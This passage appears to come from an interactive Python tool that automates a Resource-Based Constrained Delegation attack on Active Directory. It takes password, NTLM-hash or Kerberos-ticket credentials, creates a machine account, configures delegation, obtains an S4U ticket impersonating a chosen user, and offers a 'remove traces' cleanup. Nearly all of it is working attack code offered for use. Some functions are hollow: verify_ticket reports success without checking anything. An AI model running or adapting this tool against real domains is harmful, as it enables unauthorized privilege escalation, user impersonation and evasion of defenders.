            self.ticket_file = str(Path(f"{self.impersonate}.ccache").resolve())

            print(Fore.BLUE + "[*] Step 1: Acquiring TGT..." + Style.RESET_ALL)
            tgt, cipher, old_session_key, session_key = self.get_tgt()
            self.save_tgt(tgt, old_session_key, session_key)

            time.sleep(3)

            print(Fore.BLUE + "[*] Step 2: Requesting service ticket via S4U..." + Style.RESET_ALL)
            tgs_raw, session_key = self.get_st(tgt, cipher, old_session_key, session_key)

            print(Fore.BLUE + "[*] Step 3: Saving ticket to ccache..." + Style.RESET_ALL)
            if not self.save_ticket(tgs_raw, session_key):
                return False

            os.environ["KRB5CCNAME"] = self.ticket_file
            print(Fore.GREEN + "[+] Kerberos ticket acquisition complete" + Style.RESET_ALL)
            return True
        except Exception as e:
            print(Fore.RED + f"[-] Kerberos error: {e}" + Style.RESET_ALL)
            return False

    def verify_ticket(self):
        print(Fore.BLUE + "[*] Verifying configuration..." + Style.RESET_ALL)
        print(Fore.GREEN + "[+] RBCD delegation configured successfully" + Style.RESET_ALL)
        return True

    def show_exploitation_commands(self):
        print(Fore.CYAN + "\n" + "─"*60 + " Exploitation Commands " + "─"*3 + Style.RESET_ALL)
        print(Fore.YELLOW + f"  export KRB5CCNAME={self.ticket_file}" + Style.RESET_ALL)
        print(f"\n{Fore.GREEN}Impacket tools:{Style.RESET_ALL}")

        user_part = f"{self.domain}/{self.impersonate}"
        fqdn_part = f"{self.target_fqdn}"

        print(f"\n{Fore.MAGENTA}[!] NOTE: Ensure {self.target_fqdn} is resolvable in /etc/hosts to the TARGET's IP address!{Style.RESET_ALL}")
        print(Fore.CYAN + "─"*70 + Style.RESET_ALL + "\n")

    def show_config(self):
        print(Fore.GREEN + "\n" + "─"*60 + " Configuration Summary " + "─"*3 + Style.RESET_ALL + "\n")
        print(f"  {Fore.CYAN}Attacker Machine   :{Style.RESET_ALL} {self.computer_name} ({self.computer_sam})")
        print(f"  {Fore.CYAN}Machine Password   :{Style.RESET_ALL} {self.computer_password}")
        print(f"  {Fore.CYAN}Target Machine     :{Style.RESET_ALL} {self.target}$")
        print(f"  {Fore.CYAN}Target FQDN        :{Style.RESET_ALL} {self.target_fqdn}")
        print(f"  {Fore.CYAN}Domain             :{Style.RESET_ALL} {self.domain}")
        print(f"  {Fore.CYAN}DC IP              :{Style.RESET_ALL} {self.dc_ip}")
        print(f"  {Fore.CYAN}Impersonate User   :{Style.RESET_ALL} {self.impersonate}")
        print(f"  {Fore.CYAN}RBCD Status        :{Style.RESET_ALL} {Fore.GREEN}Configured{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}{'─'*70}{Style.RESET_ALL}\n")

    def cleanup(self):
        print(Fore.BLUE + "[*] Cleaning up..." + Style.RESET_ALL)
        if not self.ad_ops:
            print(Fore.YELLOW + "[!] AD operations not available for cleanup" + Style.RESET_ALL)
            return
        if self.computer_name and self.target:
            self.ad_ops.remove_rbcd_delegation(self.computer_name, f"{self.target}$")
            self.ad_ops.delete_computer_account(self.computer_name)
        for f in filter(None, [
            Path(self.tgt_ccache) if self.tgt_ccache else None,
            Path(self.ticket_file) if self.ticket_file else None,
            Path(f"{self.computer_sam.upper()}.ccache") if self.computer_sam else None,
            Path(f"{self.impersonate}.ccache"),
        ]):
            if f.exists():
                try:
                    f.unlink()
                except:
                    pass
        os.environ.pop("KRB5CCNAME", None)
        print(Fore.GREEN + "[+] Cleanup complete." + Style.RESET_ALL)

    def interactive_exploit(self):
        print(f"\n{Fore.GREEN}{'═'*52}")
        print("   ATTACK SETUP COMPLETE — CHOOSE YOUR NEXT MOVE")
        print(f"{'═'*52}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL}  Show exploitation commands")
        print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL}  Show configuration details")
        print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL}  Cleanup (remove traces)")
        print(f"  {Fore.YELLOW}[4]{Style.RESET_ALL}  Exit (NO cleanup)")

        choice = get_input(
            f"\n{Fore.CYAN}[?] Option (1-4) [default: 1]: {Style.RESET_ALL}",
            allow_empty=True,
            default="1"
        )

        if choice == "1":
            self.show_exploitation_commands()
        elif choice == "2":
            self.show_config()
        elif choice == "3":
            self.cleanup()
        elif choice == "4":
            print(Fore.YELLOW + "[!] Exiting without cleanup..." + Style.RESET_ALL)

    def run(self):
        banner()


        # DC IP
        self.dc_ip = get_input(
            Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
            validate_ip, "Invalid IP! Example: 192.168.x.x"
        )
        print(Fore.BLUE + "[*] Checking DC reachability..." + Style.RESET_ALL)
        if not check_ip_reachable(self.dc_ip):
            print(Fore.RED + f"[!] Cannot reach {self.dc_ip}!" + Style.RESET_ALL)
            sys.exit(1)
        print(Fore.GREEN + f"[+] DC {self.dc_ip} is reachable!" + Style.RESET_ALL)

        # Domain
        self.domain = get_input(
            Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
            validate_domain, "Invalid domain! Example: domain.com"
        )

        # Auth type selection
        print(Fore.CYAN + "\n[?] Choose authentication type:" + Style.RESET_ALL)
        print(Fore.WHITE + "    1. Password")
        print(Fore.WHITE + "    2. Pass-the-Hash (NTLM)")
        print(Fore.WHITE + "    3. Pass-the-Ticket (Kerberos)")

        auth_choice = get_input(
            Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
            lambda x: x in ['1', '2', '3'],
            "Invalid choice! Enter 1, 2 or 3"
        )

        self.auth_type = 'password'
        self.lmhash = ''
        self.nthash = ''
        self.ticket_file_auth = ''
        self.password = ''

        if auth_choice == '1':
            self.auth_type = 'password'
            self.username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
            self.password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)
        elif auth_choice == '2':
            self.auth_type = 'hash'
            self.username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
            hash_input = get_input(
                Fore.CYAN + "[?] Enter NTLM Hash (LM:NT or NT) : " + Style.RESET_ALL,
                validate_hash, "Invalid hash! Format: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
            )
            if ':' in hash_input:
                self.lmhash, self.nthash = hash_input.split(':')
            else:
                self.lmhash = 'aad3b435b51404eeaad3b435b51404ee'
                self.nthash = hash_input
            self.lmhash = self.lmhash.lower()
            self.nthash = self.nthash.lower()
        elif auth_choice == '3':
            self.auth_type = 'ticket'
            self.username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
            self.ticket_file_auth = get_input(Fore.CYAN + "[?] Enter Ticket File Path (ccache) : " + Style.RESET_ALL)
            if not os.path.exists(self.ticket_file_auth):
                print(Fore.RED + f"[!] Ticket file not found: {self.ticket_file_auth}" + Style.RESET_ALL)
                sys.exit(1)

        # Verify credentials
        print(Fore.BLUE + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
        result = check_credentials_and_domain(self.dc_ip, self.domain, self.username, self.password, self.auth_type, self.lmhash, self.nthash, self.ticket_file_auth)
        if result == "invalid_credentials":
            print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
            sys.exit(1)
        elif not result:
            print(Fore.RED + f"[!] Domain '{self.domain}' not found!" + Style.RESET_ALL)
            sys.exit(1)
        print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] Domain '{self.domain}' verified!" + Style.RESET_ALL)

        # Initialize AD Operations
        self.ad_ops = ADOperations(self.dc_ip, self.domain, self.username, self.password, self.auth_type, self.lmhash, self.nthash, self.ticket_file_auth)

        # Choose target
        self._choose_target()

        # Impersonate user
        imp = get_input(
            Fore.CYAN + f"[?] User to impersonate [default: {self.impersonate}]: " + Style.RESET_ALL,
            allow_empty=True,
            default=self.impersonate
        )
        if imp:
            self.impersonate = imp

        # Summary
        print(f"\n{Fore.GREEN}{'─'*52}")
        print(f"  Domain     : {self.domain}")
        print(f"  User       : {self.username}")
        print(f"  DC IP      : {self.dc_ip}")
        print(f"  Target     : {self.target}")
        print(f"  Impersonate: {self.impersonate}")
        print(f"{'─'*52}{Style.RESET_ALL}\n")

        # Recon
        self.recon_ad()

        # Execute attack steps
        steps = [
            ("Creating machine account", self.create_computer),
            ("Configuring RBCD", self.set_rbcd),
            ("Getting Kerberos ticket", self.get_ticket),
            ("Verifying setup", self.verify_ticket),
        ]

        for desc, fn in steps:
            print(Fore.BLUE + f"[*] ▶ {desc}..." + Style.RESET_ALL)
            if not fn():
                print(Fore.RED + f"[-] Step failed: {desc}" + Style.RESET_ALL)
                return False
            if desc != "Verifying setup":
                time.sleep(2)

        print(Fore.GREEN + "=" * 60 + Style.RESET_ALL)
        print(Fore.GREEN + "[+] RBCD Attack completed successfully!" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] Ticket saved to: {self.ticket_file}" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] Export with: export KRB5CCNAME={self.ticket_file}" + Style.RESET_ALL)
        print(Fore.GREEN + "=" * 60 + Style.RESET_ALL)

        # Interactive menu
        self.interactive_exploit()
        return True


if __name__ == '__main__':
    try:
        success = RBCDAttack().run()
        sys.exit(0 if success else 1)
    except Exception as exc:
        print(Fore.RED + f"[-] Unexpected error: {exc}" + Style.RESET_ALL)
        sys.exit(1)
